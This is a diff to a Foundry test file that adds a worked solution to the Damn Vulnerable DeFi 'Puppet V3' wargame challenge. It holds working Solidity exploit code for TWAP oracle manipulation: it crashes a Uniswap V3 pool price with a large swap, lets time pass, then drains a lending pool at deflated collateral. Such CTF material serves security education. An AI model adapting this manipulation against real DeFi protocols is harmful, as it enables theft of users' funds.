@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
 import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
@@ -13,22 +14,28 @@ import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
-    address player = makeAddr("player");
+    address player   = makeAddr("player");
     address recovery = makeAddr("recovery");
 
-    uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
-    uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY = 100e18;
-    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
-    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
+    uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY    = 100e18;
+    uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY     = 100e18;
+    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE       = 110e18;
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE         = 1e18;
     uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
-    uint24 constant FEE = 3000;
+    uint24  constant FEE                                = 3000;
 
-    IUniswapV3Factory uniswapFactory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
+    // Live mainnet addresses — resolved via mainnet fork at block 15450164
+    IUniswapV3Factory uniswapFactory =
+        IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
     INonfungiblePositionManager positionManager =
         INonfungiblePositionManager(payable(0xC36442b4a4522E871399CD717aBDD847Ab11FE88));
+    // Uniswap V3 SwapRouter on mainnet
+    ISwapRouter swapRouter =
+        ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
     WETH weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+
     DamnValuableToken token;
-    PuppetV3Pool lendingPool;
+    PuppetV3Pool      lendingPool;
 
     uint256 initialBlockTimestamp;
 
@@ -116,10 +123,67 @@ contract PuppetV3Challenge is Test {
     }
 
     /**
-     * CODE YOUR SOLUTION HERE
+     * =========================================================
+     * SOLUTION — test_puppetV3()
+     * =========================================================
+     * Attack: TWAP oracle manipulation via insufficient window length
+     *
+     * PuppetV3Pool uses OracleLibrary.consult(secondsAgo: 600) — a
+     * 10-minute TWAP. _isSolved() requires completion in < 115 seconds.
+     *
+     * The attacker cannot fill the full 600s window, but doesn't need to.
+     * Even 110 seconds of manipulated price within the 600s window shifts
+     * the arithmetic mean tick enough to reduce collateral requirements
+     * below the player's ~1 WETH budget.
+     *
+     * Steps:
+     * 1. Dump all 110 DVT → WETH via UniV3 SwapRouter
+     *    → crashes pool tick (price of DVT in WETH collapses)
+     * 2. Warp 110 seconds forward (stays under 115s _isSolved() limit)
+     *    → TWAP window now contains 110s of manipulated price
+     *    → arithmetic mean tick shifts, reducing collateral requirement
+     * 3. Wrap all ETH + received WETH
+     * 4. Approve and borrow all 1M DVT at deflated collateral rate
+     * 5. Transfer to recovery
+     *
+     * Requires: MAINNET_FORKING_URL in .env (forks block 15450164)
+     * =========================================================
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        // Step 1: Dump all player DVT → WETH to crash the pool's current tick
+        // Swapping 110 DVT into a 100 WETH / 100 DVT pool moves the price sharply
+        token.approve(address(swapRouter), PLAYER_INITIAL_TOKEN_BALANCE);
+        swapRouter.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn:           address(token),
+                tokenOut:          address(weth),
+                fee:               FEE,
+                recipient:         player,
+                deadline:          block.timestamp,
+                amountIn:          PLAYER_INITIAL_TOKEN_BALANCE,
+                amountOutMinimum:  0,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
+        // Step 2: Warp 110 seconds forward
+        // TWAP window (600s) now includes 110s at the manipulated (low) tick.
+        // Arithmetic mean tick shifts enough to bring collateral within budget.
+        // Must stay under 115s to pass _isSolved() time check.
+        vm.warp(block.timestamp + 110);
+
+        // Step 3: Wrap all ETH to WETH (pool requires WETH collateral via transferFrom)
+        weth.deposit{value: player.balance}();
+
+        // Step 4: Approve and borrow all 1M DVT at the deflated TWAP rate
+        uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(
+            LENDING_POOL_INITIAL_TOKEN_BALANCE
+        );
+        weth.approve(address(lendingPool), wethRequired);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        // Step 5: Transfer all recovered DVT to recovery address
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
